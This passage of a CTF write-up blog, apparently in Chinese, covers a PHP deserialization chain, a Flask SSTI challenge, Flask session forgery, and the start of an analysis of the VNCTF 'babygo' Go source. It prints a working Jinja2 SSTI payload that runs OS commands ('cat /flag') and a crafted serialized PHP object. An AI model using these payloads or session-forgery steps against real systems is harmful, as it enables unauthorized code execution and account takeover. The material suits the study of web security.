class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> gBoBg;</span><br><span class="line"><span class="variable">$a</span>-&gt;coos = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$b</span>-&gt;aaa = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decode</span>(<span class="string">&quot;p8vfuv8g8v8py&quot;</span>);</span><br><span class="line"><span class="comment"># O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:4:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:3:&quot;123&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;s:11:&quot; gBoBg eeee&quot;;s:3:&quot;-_-&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span></span><br><span class="line"><span class="comment"># fe1ka1ele1efp</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233852859.png" alt="image-20230408233852859"></p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>源码 app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现就是一个简单的ssti</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;j&#x27;)).read()&quot;)&#125;&#125;?j=cat /flag</span><br></pre></td></tr></table></figure><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>首先注册一个测试用户，例如账号1密码1</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213756405.png" alt="image-20230409213756405"></p><p>很明显的存在flask session</p><p>然后1里面有个learn的超链接，点进去以后可以得到部分源码</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213919740.png" alt="image-20230409213919740"></p><p>拿到了secret_key</p><p>于是这个来进行伪造admin登录</p><p>这里采用flask-unsign工具进行flask-session伪造，工具安装：<a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214309969.png" alt="image-20230409214309969"></p><p>然后访问页面，发现有个下载</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214835276.png" alt="image-20230409214835276"></p><p>然后下载这个项目源码默认一般是/app/app.py</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214943041.png" alt="image-20230409214943041"></p><p>然后发现有个hello路由可以执行rce</p><p>最终payload：</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409215037897.png" alt="image-20230409215037897"></p>]]></content>
      
      
      <categories>
          
          <category> 复现赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF_babygo</title>
      <link href="/2023/02/23/VNCTF-babygo/"/>
      <url>/2023/02/23/VNCTF-babygo/</url>
      
        <content type="html"><![CDATA[<h2 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h2><p>这个题目确实挺baby的我初学者都能写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) <span class="comment">// shallow = /tmp/4b997ad5487153fba0162e525abd6b7d/</span></span><br><span class="line">session.Save()</span><br><span class="line">fileutil.CreateDir(userDir)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := userUploadDir + file.Filename</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">fileutil.RemoveFile(filename)</span><br><span class="line">&#125;</span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line"><span class="keyword">var</span> ctfer User</span><br><span class="line">decoder.Decode(&amp;ctfer)</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挨个分析路由</p><p>首先是/</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="comment">// session中的shallow的值设置为userDir的值，并且保存这个session</span></span><br><span class="line">    session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) </span><br><span class="line">    session.Save()</span><br><span class="line">    <span class="comment">// 用你的userDir创建一个目录</span></span><br><span class="line">    fileutil.CreateDir(userDir)</span><br><span class="line">    <span class="comment">// 在你的userdir里面创建user.gob文件</span></span><br><span class="line">    gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">    user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">    <span class="comment">// 对象序列化存入user.gob</span></span><br><span class="line">    encoder := gob.NewEncoder(gobFile)</span><br><span class="line">    encoder.Encode(user)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后是/upload路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">    fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">    <span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    filename := userUploadDir + file.Filename</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">        fileutil.RemoveFile(filename)</span><br><span class="line">    &#125;</span><br><span class="line">    err = c.SaveUploadedFile(file, filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码没什么特别的，就是一个文件上传功能，过滤了.gob和.go文件，上传文件存放在/tmp/{userDir}/upload</p><p>然后是/unzip路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">    destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">        <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">            err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个路由是个解压功能，下面这段就是如果是zip则解压到destpath这个路径，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">    <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">        err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span 